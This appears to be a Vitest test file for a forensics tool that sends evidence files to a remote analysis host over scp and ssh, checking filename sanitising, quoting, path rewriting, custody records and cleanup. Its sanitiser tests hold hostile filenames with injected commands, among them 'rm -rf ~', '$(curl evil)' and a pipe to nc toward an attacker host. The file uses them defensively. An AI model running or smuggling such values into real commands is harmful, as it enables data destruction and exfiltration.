import { describe, it, expect, beforeEach } from "vitest";
import { mkdtemp, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  deliver, rewriteToRemote, safeRemoteName, shellQuote,
  type TransferRunner, type TransferResult,
} from "../../src/integrations/mcp/mcpDelivery.js";
import { DEFAULT_DELIVERY, type McpServer, type McpDelivery } from "../../src/integrations/mcp/mcpServerStore.js";

interface Call { binary: string; args: string[]; timeoutMs: number; signal?: AbortSignal }

let calls: Call[];
let nextResult: TransferResult;

const runner: TransferRunner = async (binary, args, opts) => {
  calls.push({ binary, args, timeoutMs: opts.timeoutMs, signal: opts.signal });
  return nextResult;
};

const server = (delivery: Partial<McpDelivery> = {}): McpServer => ({
  id: "sift-mcp", label: "SIFT", enabled: true,
  allowedTools: [], allowedCommands: [], agentEnabled: false, timeoutMs: 300_000,
  delivery: { ...DEFAULT_DELIVERY, ...delivery },
});

const SCP = { mode: "scp" as const, host: "sift.lab", user: "analyst", remoteDir: "/cases/incoming" };

beforeEach(() => {
  calls = [];
  nextResult = { stdout: "", stderr: "", code: 0 };
});

describe("safeRemoteName", () => {
  it("keeps an ordinary evidence filename recognizable", () => {
    expect(safeRemoteName("/cases/c1/imports/memory.raw")).toBe("memory.raw");
  });

  // ssh runs its remote argument through a shell, and filenames come from evidence.
  it("strips shell metacharacters out of a hostile filename", () => {
    expect(safeRemoteName("/cases/c1/x; rm -rf ~").replace(/_+$/, "")).toBe("x_rm_-rf");
    expect(safeRemoteName("/cases/c1/$(curl evil).raw")).toBe("_curl_evil_.raw");
    expect(safeRemoteName("/cases/c1/`whoami`")).toBe("_whoami_");
    expect(safeRemoteName("mem.raw|nc attacker 443")).toBe("mem.raw_nc_attacker_443");
  });

  // basename() discards everything up to the last separator, so a payload with a slash in it is
  // mostly gone before sanitizing even runs. The remainder still has to be safe.
  it("keeps only the last path segment", () => {
    expect(safeRemoteName("/cases/c1/x; rm -rf ~/.ssh")).toBe(".ssh");
  });

  it("never yields a name that is only dots", () => {
    expect(safeRemoteName("/cases/c1/..")).toBe("evidence.dat");
    expect(safeRemoteName("/cases/c1/.")).toBe("evidence.dat");
  });

  it("bounds the length", () => {
    expect(safeRemoteName(`/cases/${"a".repeat(300)}`)).toHaveLength(120);
  });
});

describe("shellQuote", () => {
  it("wraps a value so a shell sees one word", () => {
    expect(shellQuote("/cases/a b")).toBe("'/cases/a b'");
  });

  it("escapes an embedded single quote", () => {
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
  });
});

describe("rewriteToRemote", () => {
  it("passes the path through when the mount is at the same place on both sides", () => {
    expect(rewriteToRemote(server(), "/evidence/mem.raw")).toBe("/evidence/mem.raw");
  });

  it("swaps the local prefix for the remote one", () => {
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });
    expect(rewriteToRemote(s, "/srv/cases/c1/imports/mem.raw")).toBe("/mnt/dfir/c1/imports/mem.raw");
  });

  it("refuses a path the analysis host cannot reach", () => {
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });
    expect(() => rewriteToRemote(s, "/home/analyst/mem.raw")).toThrow(/not under this server's local prefix/);
  });

  it("produces a POSIX path from a Windows-style local path", () => {
    const s = server({ localPrefix: "C:\\cases", remotePrefix: "/mnt/dfir" });
    expect(rewriteToRemote(s, "C:\\cases\\c1\\mem.raw")).toBe("/mnt/dfir/c1/mem.raw");
  });
});

describe("deliver — remote-path mode", () => {
  it("hands back the rewritten path and copies nothing", async () => {
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });

    const target = await deliver(s, "/srv/cases/c1/mem.raw", { runner });

    expect(target.remotePath).toBe("/mnt/dfir/c1/mem.raw");
    expect(calls).toHaveLength(0);
    expect(target.cleanup).toBeUndefined();   // nothing was staged, so nothing to remove
  });

  // Nothing moves, but the evidence is handed to another system to read.
  it("still records a custody transfer", async () => {
    const seen: string[] = [];
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });

    await deliver(s, "/srv/cases/c1/mem.raw", { runner, recordTransfer: async (d) => { seen.push(d); } });

    expect(seen).toEqual(["SIFT (shared path /mnt/dfir/c1/mem.raw)"]);
  });
});

describe("deliver — scp mode", () => {
  it("pushes the file and returns the staged remote path", async () => {
    const target = await deliver(server(SCP), "/cases/c1/imports/mem.raw", { runner });

    expect(calls).toHaveLength(1);
    expect(calls[0].binary).toBe("scp");
    expect(calls[0].args).toEqual([
      "-o", "BatchMode=yes", "--", "/cases/c1/imports/mem.raw", "analyst@sift.lab:/cases/incoming/mem.raw",
    ]);
    expect(target.remotePath).toBe("/cases/incoming/mem.raw");
    expect(target.destination).toBe("analyst@sift.lab:/cases/incoming/mem.raw");
  });

  // BatchMode on and StrictHostKeyChecking untouched: an unknown host fails closed rather than
  // trusting whatever answered the address.
  it("never prompts and never disables host-key checking", async () => {
    await deliver(server(SCP), "/cases/c1/mem.raw", { runner });
    const args = calls[0].args.join(" ");
    expect(args).toContain("BatchMode=yes");
    expect(args).not.toContain("StrictHostKeyChecking");
  });

  it("passes an identity file and a non-default port", async () => {
    await deliver(server({ ...SCP, identityFile: "/home/dfir/.ssh/lab", port: 2222 }), "/cases/c1/mem.raw", { runner });
    expect(calls[0].args).toEqual([
      "-o", "BatchMode=yes", "-i", "/home/dfir/.ssh/lab", "-P", "2222",
      "--", "/cases/c1/mem.raw", "analyst@sift.lab:/cases/incoming/mem.raw",
    ]);
  });

  it("omits the port flag when it is the default", async () => {
    await deliver(server(SCP), "/cases/c1/mem.raw", { runner });
    expect(calls[0].args).not.toContain("-P");
  });

  it("uses a bare host when no user is configured", async () => {
    await deliver(server({ ...SCP, user: "" }), "/cases/c1/mem.raw", { runner });
    expect(calls[0].args).toContain("sift.lab:/cases/incoming/mem.raw");
  });

  it("sanitizes the remote filename rather than trusting the evidence name", async () => {
    const target = await deliver(server(SCP), "/cases/c1/imports/x; rm -rf ~", { runner });
    expect(target.remotePath).toBe("/cases/incoming/x_rm_-rf_");
  });

  it("uses the delivery timeout, not the call timeout", async () => {
    await deliver(server(SCP), "/cases/c1/mem.raw", { runner });
    expect(calls[0].timeoutMs).toBe(3_600_000);
  });

  it("threads the cancel signal into the transfer", async () => {
    const controller = new AbortController();
    await deliver(server(SCP), "/cases/c1/mem.raw", { runner, signal: controller.signal });
    expect(calls[0].signal).toBe(controller.signal);
  });

  it("reports byte progress by polling the staged file size over SSH", async () => {
    const dir = await mkdtemp(join(tmpdir(), "dfir-mcp-progress-"));
    const localPath = join(dir, "mem.raw");
    await writeFile(localPath, Buffer.alloc(1024));
    const progress: Array<[number, number]> = [];
    const pollingRunner: TransferRunner = async (binary, args, opts) => {
      calls.push({ binary, args, timeoutMs: opts.timeoutMs, signal: opts.signal });
      if (binary === "scp") {
        await new Promise((resolve) => setTimeout(resolve, 30));
        return { stdout: "", stderr: "", code: 0 };
      }
      return { stdout: "512\n", stderr: "", code: 0 };
    };
    try {
      await deliver(server(SCP), localPath, {
        runner: pollingRunner,
        progressIntervalMs: 5,
        onProgress: (done, total) => { progress.push([done, total]); },
      });
    } finally {
      await rm(dir, { recursive: true, force: true });
    }

    expect(calls.some((c) => c.binary === "ssh" && c.args.includes("stat"))).toBe(true);
    expect(progress[0]).toEqual([0, 1024]);
    expect(progress).toContainEqual([512, 1024]);
    expect(progress.at(-1)).toEqual([1024, 1024]);
  });

  it("fails with what scp said when the copy fails", async () => {
    nextResult = { stdout: "", stderr: "Host key verification failed.\n", code: 1 };

    await expect(deliver(server(SCP), "/cases/c1/mem.raw", { runner }))
      .rejects.toThrow(/scp to analyst@sift\.lab:.*failed \(exit 1\): Host key verification failed\./);
  });

  it("records a custody transfer naming where the bytes went", async () => {
    const seen: string[] = [];
    await deliver(server(SCP), "/cases/c1/mem.raw", { runner, recordTransfer: async (d) => { seen.push(d); } });
    expect(seen).toEqual(["analyst@sift.lab:/cases/incoming/mem.raw"]);
  });

  // A failed transfer moved nothing, so the chain must not claim it did.
  it("records no custody transfer when the copy failed", async () => {
    nextResult = { stdout: "", stderr: "no route to host", code: 255 };
    const seen: string[] = [];

    await expect(deliver(server(SCP), "/cases/c1/mem.raw", { runner, recordTransfer: async (d) => { seen.push(d); } }))
      .rejects.toThrow();

    expect(seen).toEqual([]);
  });
});

describe("deliver — scp cleanup", () => {
  it("removes the staged copy over ssh, with the path quoted", async () => {
    const target = await deliver(server(SCP), "/cases/c1/mem.raw", { runner });
    calls.length = 0;

    await target.cleanup?.();

    expect(calls).toHaveLength(1);
    expect(calls[0].binary).toBe("ssh");
    expect(calls[0].args).toEqual([
      "-o", "BatchMode=yes", "analyst@sift.lab", "rm", "-f", "--", "'/cases/incoming/mem.raw'",
    ]);
  });

  it("passes the non-default port with ssh's lowercase flag", async () => {
    const target = await deliver(server({ ...SCP, port: 2222 }), "/cases/c1/mem.raw", { runner });
    calls.length = 0;
    await target.cleanup?.();
    expect(calls[0].args).toContain("-p");
    expect(calls[0].args).toContain("2222");
  });

  // Failing an analysis whose result already arrived, over a leftover temp file, helps nobody.
  it("swallows a failed cleanup", async () => {
    // Copies fine, but the box is gone by the time we try to tidy up.
    const flaky: TransferRunner = async (binary) => {
      if (binary === "ssh") throw new Error("connection lost");
      return { stdout: "", stderr: "", code: 0 };
    };
    const target = await deliver(server(SCP), "/cases/c1/mem.raw", { runner: flaky });

    await expect(target.cleanup?.()).resolves.toBeUndefined();
  });
});
